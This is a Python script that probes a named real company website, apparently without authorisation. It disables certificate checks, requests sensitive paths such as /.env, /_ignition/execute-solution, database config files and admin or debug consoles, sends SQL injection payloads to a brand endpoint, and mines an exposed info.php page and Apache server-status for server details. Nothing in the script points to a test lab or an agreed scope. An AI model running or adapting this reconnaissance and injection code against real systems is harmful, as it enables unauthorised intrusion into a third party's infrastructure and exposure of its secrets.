import requests, urllib3, re
urllib3.disable_warnings()

base = "https://www.parleagro.com"

# Check 500 error pages content
print("=== 500 ERROR PAGE CONTENT (brand/4) ===")
try:
    r = requests.get(base + "/brand/4", timeout=5, verify=False)
    print(r.text[:2000])
except Exception as e:
    print(f"Error: {e}")

print("\n" + "="*60)

# Check other potential 500 endpoints
print("=== MORE ENDPOINTS ===")
paths = [
    "/api/brand/1", "/api/brand/999",
    "/brand/999999", "/brand/a", "/brand/1/delete",
    "/admin/brand", "/admin/brand/1",
    "/_ignition/health-check", "/_ignition/execute-solution",
    "/vendor/autoload.php", "/vendor/composer/installed.json",
    "/.env/something", "/config/database.php",
    "/debug", "/debugbar", "/telescope",
    "/horizon", "/nova", "/nova/login",
    "/admin/login", "/admin/dashboard",
]
for p in paths:
    try:
        r = requests.get(base + p, timeout=5, verify=False, allow_redirects=False)
        if r.status_code not in [404, 301, 302]:
            print(f"{p:45s} -> {r.status_code} ({len(r.content)}B) {r.text[:80]}")
    except:
        pass

# Check for SQL injection in brand parameter
print("\n=== SQLI TEST ===")
sqli_payloads = ["1'", "1 AND 1=1", "1 AND 1=2", "1 UNION SELECT 1", "1' OR '1'='1"]
for p in sqli_payloads:
    try:
        r = requests.get(base + f"/brand/{p}", timeout=5, verify=False)
        if r.status_code != 404:
            print(f"/brand/{p} -> {r.status_code} ({len(r.content)}B)")
    except:
        pass

# Check info.php for Apache modules and PHP extensions
print("\n=== PHP INFO DETAILS ===")
try:
    r = requests.get(base + "/info.php", timeout=10, verify=False)
    html = r.text
    
    # Apache loaded modules
    apache_section = re.search(r"<h2>apache2handler</h2>.*?<table[^>]*>(.*?)</table>", html, re.DOTALL)
    if apache_section:
        modules = re.findall(r'<td class="e">([^<]+)</td>', apache_section.group(1))
        print("Apache modules:", ", ".join(modules[:20]))
    
    # PHP extensions
    ext_section = re.search(r"<h2>PHP Credits</h2>", html)
    if ext_section:
        # Find all extension tables
        for ext in re.findall(r'<h2>(?:PHP |)([A-Z][a-z]+[^<]*)</h2>', html):
            if ext not in ["Credits", "License", "Configuration"]:
                print(f"Extension section: {ext}")
except Exception as e:
    print(f"Error: {e}")

# Check Apache status
print("\n=== APACHE STATUS ===")
for sp in ["/server-status", "/server-info", "/server-status?auto"]:
    try:
        r = requests.get(base + sp, timeout=5, verify=False)
        if r.status_code not in [404, 403]:
            print(f"{sp} -> {r.status_code} ({len(r.content)}B)")
            print(r.text[:300])
    except:
        pass
